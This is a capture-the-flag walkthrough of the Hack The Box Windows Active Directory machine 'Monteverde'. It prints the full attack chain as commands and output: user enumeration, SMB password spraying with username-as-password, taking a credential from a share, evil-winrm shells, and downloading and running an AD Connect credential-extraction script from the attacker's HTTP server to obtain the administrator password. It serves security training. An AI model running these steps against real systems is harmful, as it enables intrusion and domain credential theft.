# Monteverde

<table>
    <tr>
    <td style="text-align:right;"><b>OS</b></td>
    <td>Windows</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Difficulty</b></td>
    <td>Medium</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Points</b></td>
    <td>30</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>Release</b></td>
    <td>11 Jan 2020</td>
    </tr>
    <tr>
    <td style="text-align:right;"><b>IP</b></td>
    <td>10.10.10.172</td>
    </tr>
</table>

## Summary

This machine begins by querying the users and seeing that one of the users has a password the same as the user account. From there, we enumerate SMB shares to find the password of another user to get a shell. To escalate to root, we take advantage of an exploit for users in the Azure Admins group to print out Administrator's password.

## Foothold

To begin, we will add the entry `10.10.10.172 monteverde.htb` to `/etc/hosts` and then start scanning.

```
# nmap -sC -sV -T4 monteverde.htb
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-27 22:56:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

From this, we see that this is an AD machine for domain `MEGABANK.LOCAL0`. An additional port scan of all ports shows Windows Remote Management is enabled. To start enumeration, we will try to look at SMB shares with no credentials but we are met with a logon failure.

```
# smbclient -L monteverde.htb -U ""
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

We will try to get some credentials so we can enumerate this later. To start, we will query LDAP for a list of users using `enum4linux`.

```
# enum4linux -U monteverde.htb 2>/dev/null
...
 =============================== 
|    Users on monteverde.htb    |
 =============================== 
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
...
```

We can put these users in a file, `users.txt`, and see if any of them have no password or a trivial password set. We will use the Metasploit module `smb_login`.

```
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS monteverde.htb
RHOSTS => monteverde.htb
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf5 auxiliary(scanner/smb/smb_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/smb/smb_login) > set BLANK_PASSWORDS true
BLANK_PASSWORDS => true
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.10.10.172:445      - 10.10.10.172:445 - Correct credentials, but unable to login: '.\Guest:',
[*] monteverde.htb:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf5 auxiliary(scanner/smb/smb_login) > set USER_AS_PASS true
USER_AS_PASS => true
msf5 auxiliary(scanner/smb/smb_login) > run

[+] 10.10.10.172:445      - 10.10.10.172:445 - Success: '.\SABatchJobs:SABatchJobs'
[*] monteverde.htb:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We see that the `SABatchJobs` user has a password that is the same as the user. This user is not part of the Remote Management Users group so we cannot get a shell as them but we can try to query SMB shares now.

```
# smbclient -L monteverde.htb -U "SABatchJobs"
Enter WORKGROUP\SABatchJobs's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk 
```

## User

The first share that looks useful is `azure_uploads` but there is nothing in it that we can see. The second share that is useful is `users$` which has four user folders that we can query.

```
# smbclient \\\\monteverde.htb\\users$ -U "SABatchJobs"
Enter WORKGROUP\SABatchJobs's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                524031 blocks of size 4096. 519955 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \mhope\azure.xml of size 1212 as azure.xml (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
```

If we look at `azure.xml`, we see a password for `mhope`.

```
# cat mhope/azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Since they are part of the Remote Management Users group, we can use `evil-winrm` to get a shell as them and read the flag.

```
# evil-winrm -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r$

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
496197**************************
```

## Root

Doing some simple enumeration, we see that `mhope` is part of the "Azure Admins" group.

```
*Evil-WinRM* PS C:\Users\mhope> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
...
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
...
```

In a [blog post](https://blog.xpnsec.com/azuread-connect-for-redteam/) about this group, we see that we can take advantage of this membership in order to print out the Administrator password. We will host the exploit on our machine with a Python HTTP server and download and run the file on Monteverde.

```
# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
*Evil-WinRM* PS C:\Windows\TEMP> Invoke-WebRequest http://10.10.15.15:8000/exploit.ps1 -OutFile C:\Windows\TEMP\exploit.ps1
*Evil-WinRM* PS C:\Windows\TEMP> ./exploit.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

With these credentials, we can use `evil-winrm` to get a shell as Administrator and get the flag.

```
# evil-winrm -i monteverde.htb -u Administrator -p d0m@in4dminyeah!
                                                                                                              
Evil-WinRM shell v2.3                                                                                         
                                                                                                              
Info: Establishing connection to remote endpoint                                                              
                                                                                                              
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop                                               
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt                                                  
129096**************************
```
